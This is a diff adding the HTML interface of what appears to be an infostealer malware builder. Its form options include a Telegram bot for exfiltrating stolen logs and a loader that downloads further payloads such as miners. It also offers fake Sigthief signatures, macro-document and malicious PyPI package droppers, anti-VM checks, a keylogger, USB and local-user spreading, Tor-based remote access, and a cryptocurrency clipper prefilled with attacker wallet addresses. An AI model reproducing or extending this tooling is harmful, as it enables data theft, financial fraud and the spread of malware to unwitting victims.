@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Builder</title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link rel="icon" type="image/png" href="images/builder-logo.ico"/>
+        <!-- Libs -->
+        <script type="text/javascript" src="/eel.js"></script>
+        <link rel="stylesheet" href="lib/css/uikit.min.css"/>
+        <link rel="stylesheet" href="lib/css/builder.css"/>
+        <script src="lib/js/uikit.min.js"></script>
+        <script src="lib/js/iconify-icon.min.js"></script>
+        <script src="lib/js/WS_builder.js"></script>
+        <script src="lib/js/WS_script.js"></script>
+    </head>
+    <body>
+
+        <!-- Navigation -->
+        <nav class="uk-navbar-container" uk-navbar="align: center">
+            <div class="uk-navbar">
+                <ul class="uk-navbar-nav">
+                    <li>
+                        <img width="64" height="64" src="images/logo.png" alt="Logo">
+                        <p id="project_name" class="uk-label" style="font-size: 20px; font-family: monospace;"></p>
+                    </li>
+                    <li class="nav-el">
+                        <p onclick="toggleDarkMode();">
+                            <iconify-icon icon="pajamas:appearance"></iconify-icon> 
+                            Switch theme
+                        </p>
+                    </li>
+                    <li class="nav-el">
+                        <p onclick="run_backup();">
+                            <iconify-icon icon="clarity:backup-solid-badged"></iconify-icon> 
+                            Create backup
+                        </p>
+                    </li>
+                    <li class="nav-el">
+                        <p onclick='window.open(supportUrl);'>
+                            <iconify-icon icon="ic:baseline-telegram"></iconify-icon> 
+                            Support
+                            <iconify-icon style="color: rgb(21, 174, 21);" icon="svg-spinners:pulse-2"></iconify-icon>
+                        </p>
+                    </li>
+                </ul>
+            </div>
+        </nav>
+
+
+        <!-- Telegram automatic bot creation modal -->
+        <div id="automatic-telegram-bot-modal" uk-modal>
+            <div class="uk-modal-dialog uk-modal-body">
+                <h5 class="uk-modal-title">Select telegram account</h5>
+                <!-- Accounts -->
+                <select id="selected-telegram-account" class="uk-select"></select>
+                <!-- Buttons -->
+                <p class="uk-text-right">
+                    <button class="uk-button uk-button-default uk-modal-close" type="button">
+                        <iconify-icon icon="material-symbols:close" style="font-size: 25px;"></iconify-icon>
+                    </button>
+                    <button class="uk-button uk-button-default" type="button" onclick="createNewTelegramBot();">
+                        <iconify-icon id="auto-telegram-login-icon" icon="mdi:sign-in" style="font-size: 25px;"></iconify-icon>
+                    </button>
+                </p>
+            </div>
+        </div>
+
+
+
+        <!-- Builder -->
+        <div class="uk-card uk-card-default uk-card-body">            
+
+            <label for="telegram_token" href="https://t.me/BotFather">
+                Telegram BOT token (<a href="#" onclick="warnTelegramConfiguration();">Help me, I don't know what is that</a>)
+                <input id="telegram_token" class="uk-input"  type="text" placeholder="Telegram bot token" aria-label="">
+            </label>
+            <label for="telegram_chat_id" href="https://t.me/chatIDrobot">
+                Telegram acount chat ID
+                <input id="telegram_chat_id" class="uk-input" type="number" placeholder="Telegram chat ID" aria-label="" min="-100000000000" max="1000000000000000">
+            </label>
+            
+            <label for="build_tag">Build TAG
+                <input id="build_tag" class="uk-input" type="text" placeholder="Tag" aria-label="" value="Default">
+            </label>
+            
+            <label id="loader_label" for="loader_urls">Loader (Direct links separated by comma; leave empty to disable)
+                <input id="loader_urls" class="uk-input" type="text" placeholder="http://example.com/bot.exe, http://example.com/miner.exe" aria-label="" value="">
+            </label>
+
+            <label for="rsa_public" style="display: none;">
+                RSA public key
+                <textarea id="rsa_public" class="uk-textarea"></textarea>
+            </label>
+
+            <label id="encryption_method_label" for="encryption_method">Log encryption method
+                [
+                    <span id="encryption_method_description">
+                        Log can be decrypted only by your panel
+                    </span>
+                ]
+                <div class="uk-form-controls uk-form-controls-text">
+                    <label>
+                        <input checked class="uk-radio" type="radio" name="encryption_method" value="RSA+RC4" onchange="encryption_method_changed(this);"> 
+                        RSA+RC4 encryption</label><br>
+                    <label>
+                        <input class="uk-radio" type="radio" name="encryption_method" value="RC4" onchange="encryption_method_changed(this);"> 
+                        RC4 encryption
+                    </label>
+                    
+                </div>
+            </label>
+
+            
+            <label for="instructions">
+                Grabber commands
+                <br>
+                <!-- Text hosting -->
+                <div class="uk-badge pointer" style="font-size: 15px; padding: 14px; margin-bottom: 12px;" onclick="window.open('https://rentry.co');">
+                    <iconify-icon icon="material-symbols:text-snippet-outline" style="font-size: 20px !important; margin-bottom: 5px !important;"></iconify-icon> 
+                    rentry.co
+                </div>
+                <!-- XML minifier -->
+                <div class="uk-badge pointer" style="font-size: 15px; padding: 14px; margin-bottom: 12px;" onclick="window.open('https://codebeautify.org/xml-minifier');">
+                    <iconify-icon icon="mdi:xml" style="font-size: 20px !important; margin-bottom: 5px !important;"></iconify-icon> 
+                    XML Minifier
+                </div>
+                <textarea id="instructions" class="uk-textarea" placeholder="XML or direct URL where grabber commands are located"></textarea>
+            </label>
+            
+            <label for="file-icon" id="icon_select_item">
+                File Icon [
+                    <span onclick="eel.import_icons()();" class="pointer uk-text-primary">
+                        <iconify-icon icon="uil:file-import"></iconify-icon> Import
+                    </span>
+                    ]
+                    <br>
+                <div style="display: inline-flex; width: 100%;">
+                    <img id="icon_preview" src="win-icons/app.ico" alt="ICON" width="48" height="48" style="margin-right: 10px;">
+                    <select id="file-icon" class="uk-select" onchange="iconSelected(this.value)">
+                        <option value="none" selected>No icon</option>
+                    </select>
+                </div>
+                
+            </label>
+            <br>
+
+            <!-- python sigthief.py -r -i firefox.exe -o ff.sig -->
+            <label for="file-signature" id="signature_select_item">
+                Fake signature [
+                    <span onclick="eel.import_signatures()();" class="pointer uk-text-primary">
+                        <iconify-icon icon="uil:file-import"></iconify-icon> Import (Sigthief)
+                    </span>
+                    ]
+                    <br>
+                <div style="display: inline-flex; width: 100%;">
+                    <select id="file-signature" class="uk-select">
+                        <option value="none" selected>No signature</option>
+                    </select>
+                </div>
+                
+            </label>
+
+            <label for="extension">
+                File extension
+                <select id="extension" class="uk-select" onchange="stubSelected(this.value)">
+                    <option disabled>:: Windows ::</option>
+                    <option value="win_exe" selected>Exe</option>
+                    <option value="win_scr">Scr</option>
+                    <option value="win_com">Com</option>
+                    <option value="win_cmd">Cmd</option>
+                    <option value="win_pif">Pif</option>
+                    <option value="win_bat">Bat</option>
+                    <option value="win_vbs">Vbs</option>
+                    <option value="win_wsf">Wsf</option>
+                    <option value="win_hta">Hta</option>
+                    <option value="win_py">Py (Python)</option>
+                    <option value="win_msi">Msi (May work bad in resident mode)</option>
+                    <option value="win_doc">Doc (Word macro)</option>
+                    <option value="win_docm">Docm (Word macro)</option>
+                    <option value="win_xls">Xls (Excel macro)</option>
+                    <option value="win_xll">Xll (Excel macro)</option>
+                    <option value="win_xlsm">Xlsm (Excel macro)</option>
+                    <option disabled>:: Linux ::</option>
+                    <option value="linux_sh">Sh (Bash)</option>
+                    <option value="linux_py">Py (Python 3)</option>
+                    <option disabled>:: Cross-platform ::</option>
+                    <option value="win_pypi">PyPi module upload</option>
+                </select>
+            </label>
+
+            <label for="net_version" id="net_version_label">
+                .NET framework version
+                <select id="net_version" class="uk-select">
+                    <option value="20">2.0 (Windows XP-7)</option>
+                    <option value="47" selected>4.7 (Windows 8, 10, 11)</option>
+                </select>
+            </label>
+
+            <br>
+
+            
+            <label for="pump_bytes" id="pumper_label">
+                File size pumper [<span id="newPumperSize">Disabled</span>] <br>
+                <input id="pump_bytes" type="range" aria-label="" value="0" max="1000" onchange="document.getElementById('newPumperSize').innerText = this.value + 'Mb';">
+                <br>
+            </label>
+
+            <label id="install_method_label" for="encryption_method">Execution method
+                [
+                    <span id="install_method_description">
+                        Steal data and self-destruct.
+                    </span>
+                ]
+                <div class="uk-form-controls uk-form-controls-text">
+                    <label>
+                        <input checked class="uk-radio" type="radio" name="install_method" value="Non-resident" onchange="install_method_changed(this);"> 
+                        Non-resident</label><br>
+                    <label>
+                        <input class="uk-radio" type="radio" name="install_method" value="Resident" onchange="install_method_changed(this);"> 
+                        Resident 
+                    </label>
+                    
+                </div>
+            </label>
+
+            
+            <label for="resident_method" id="resident_method_label">
+                Resident mode connection method
+                <select id="resident_method" class="uk-select">
+                    <option value="tor" selected>Tor (Anonymous; Very slow; May be banned in some countries)</option>
+                    <option value="serveo">Serveo (You will receive a special code in the telegram bot, which must be pasted into the terminal window before access)</option>
+                </select>
+            </label>
+
+            <label class="checkbox"><input id="antivm" class="uk-checkbox" type="checkbox"> AntiVM</label>
+            <label id="auto_keylogger_label" class="checkbox"><input id="auto_keylogger" class="uk-checkbox" type="checkbox"> Auto-Keylogger</label>
+            <label id="clipper_label" class="checkbox"><input id="clipper" class="uk-checkbox" type="checkbox" onchange="toggleClipper(this);"> Clipper</label>
+            <label class="checkbox"><input id="random_resources" class="uk-checkbox" type="checkbox" checked> Random resources</label>
+            <br>
+            <label class="checkbox"><input id="usbspread" class="uk-checkbox" type="checkbox"> USB Spread</label>
+            <label class="checkbox"><input id="localuserspread" class="uk-checkbox" type="checkbox"> Local users spread</label>
+            
+            <label id="clipper_setup">
+                <br><hr>
+                Clipper settings
+                <div>
+                    <iconify-icon icon="logos:bitcoin"></iconify-icon>
+                    <input id="CLIPPER_BTC_WALLET" class="uk-input" type="text" placeholder="Bitcoin wallet" aria-label="" value="bc1ql4xfyrzw83a8msa8wrqt84wxv2k2ah72285y75">
+                </div>
+                <div>
+                    <iconify-icon icon="logos:monero"></iconify-icon>
+                    <input id="CLIPPER_XMR_WALLET" class="uk-input" type="text" placeholder="Monero wallet" aria-label="" value="487sRQv2gBXHVPc59Lkz5j7bgJ28Qy8nPW6hUvRyFWxM84cWzEnmVcWf6MWEQ59BwrP4viyoz6gfqhDPb1yiUx2SUViKVwd">
+                </div>
+                <div>
+                    <iconify-icon icon="cryptocurrency-color:bch"></iconify-icon>
+                    <input id="CLIPPER_BCH_WALLET" class="uk-input" type="text" placeholder="Bitcoin cash wallet" aria-label="" value="qrduekhrfplgygxttfwdcgnvdemzqht8mvq6sv659f">
+                </div>
+                <div>
+                    <iconify-icon icon="cryptocurrency-color:zec"></iconify-icon>
+                    <input id="CLIPPER_ZEC_WALLET" class="uk-input" type="text" placeholder="Zcash wallet" aria-label="" value="t1V7NEnYmdnGVMFE7nLmW9r1DxnvBdZEcuu">
+                </div>
+                <div>
+                    <iconify-icon icon="cryptocurrency-color:eth"></iconify-icon>
+                    <input id="CLIPPER_ETH_WALLET" class="uk-input" type="text" placeholder="Etherium wallet" aria-label="" value="0x8aa21bB3CDd434feF3AF3f62B7D3b6b0D7c1Ed84">
+                </div>
+                <div>
+                    <iconify-icon icon="cryptocurrency-color:trx"></iconify-icon>
+                    <input id="CLIPPER_TRX_WALLET" class="uk-input" type="text" placeholder="Tron wallet" aria-label="" value="TDUVFAeVzaVMokh9peWoUHhpREowgtue4U">
+                </div>
+                <div>
+                    <iconify-icon icon="cryptocurrency-color:doge"></iconify-icon>
+                    <input id="CLIPPER_DOGE_WALLET" class="uk-input" type="text" placeholder="Doge wallet" aria-label="" value="DHxnaR9xBPDbRz8uh63onTTBsuNwRuTxYk">
+                </div>
+                <div>
+                    <iconify-icon icon="cryptocurrency-color:ltc"></iconify-icon>
+                    <input id="CLIPPER_LTC_WALLET" class="uk-input" type="text" placeholder="Litecoin wallet" aria-label="" value="MNYd4BUTtUY5vJoxbLWX1g3NJV5UpUYzzD">
+                </div>
+                <div>
+                    <iconify-icon icon="cryptocurrency-color:xrp"></iconify-icon>
+                    <input id="CLIPPER_XRP_WALLET" class="uk-input" type="text" placeholder="Ripple wallet" aria-label="" value="r3Ks7F5ZFSDdFfs342NejHwMKNgG4qhmRT">
+                </div>
+                <div>
+                    <iconify-icon icon="cryptocurrency-color:dash"></iconify-icon>
+                    <input id="CLIPPER_DASH_WALLET" class="uk-input" type="text" placeholder="Dashcoin wallet" aria-label="" value="XwS4NQ9kxU5BhepVaDJWz16gdxX1VMZMiq">
+                </div>
+                <div>
+                    <iconify-icon icon="cryptocurrency-color:neo"></iconify-icon>
+                    <input id="CLIPPER_NEO_WALLET" class="uk-input" type="text" placeholder="Neo wallet" aria-label="" value="AYMULiytvVNVbp1sReRiRsgaS1K5EiWm6J">
+                </div>
+                <div>
+                    <iconify-icon icon="cryptocurrency-color:xlm"></iconify-icon>
+                    <input id="CLIPPER_XLM_WALLET" class="uk-input" type="text" placeholder="Stellar wallet" aria-label="" value="GBHJCT3ADJ3KII4JTE6VRTMAZUW2SMAKNENCGEXBZVBVMJSEPYAHGRJM">
+                </div>
+                <div>
+                    <iconify-icon icon="cryptocurrency-color:bnb"></iconify-icon>
+                    <input id="CLIPPER_BNB_WALLET" class="uk-input" type="text" placeholder="BNB wallet" aria-label="" value="bnb1kdra564lcynnvhhvpkqwzxc8t8308d7nsqvvee">
+                </div>
+                <div>
+                    <iconify-icon icon="cryptocurrency-color:sol"></iconify-icon>
+                    <input id="CLIPPER_SOL_WALLET" class="uk-input" type="text" placeholder="Solana wallet" aria-label="" value="HKgb2yrH3sTysH1Pj8PpdtRHpgbbXU91jFsn6ZNSStrs">
+                </div>
+                <div>
+                    <iconify-icon icon="cryptocurrency-color:algo"></iconify-icon>
+                    <input id="CLIPPER_ALG_WALLET" class="uk-input" type="text" placeholder="Algo wallet" aria-label="" value="F2RJBJBAB2Z5SDHXUETXU2XCXTSBIXTJOYCNLLGKKSLCY6J6VJKM7RROWU">
+                </div>
+            </label>
+            
+
+            
+
+            <!-- <label class="checkbox"><input id="antirepeat" class="uk-checkbox" type="checkbox" checked> AntiRepeat</label> -->
+            <!-- <label class="checkbox"><input id="selfdestruct" class="uk-checkbox" type="checkbox" checked> SelfDestruct</label> -->
+          
+            <!-- PyPi setup -->
+            <label for="pypi_username"><br><hr>PyPi username
+                <input id="pypi_username" class="uk-input" type="text" placeholder="PyPi username" aria-label="">
+            <br></label>
+            <label for="pypi_password">PyPi password
+                <input id="pypi_password" class="uk-input" type="password" placeholder="PyPi password" aria-label="">
+            <br></label>
+            
+            <label for="pypi_name">Package name
+                <input id="pypi_name" class="uk-input" type="text" placeholder="Package name" aria-label="">
+            <br></label>
+            <label for="pypi_version">Package version
+                <input id="pypi_version" class="uk-input" type="text" placeholder="Package version" aria-label="" value="0.1">
+            <br></label>
+
+            <button id="build-button-action" class="uk-button uk-button-primary" type="button" onclick="build();">
+                <iconify-icon id="build-button-icon" icon="vaadin:compile"></iconify-icon> <span id="build-button-text">Build</span>
+            </button>
+
+        </div>
+        <span id="builder_progress_percentage"></span>
+        <progress id="builder_progress" class="uk-progress" value="0" max="100">222</progress>
+    </body>
+
+</html>
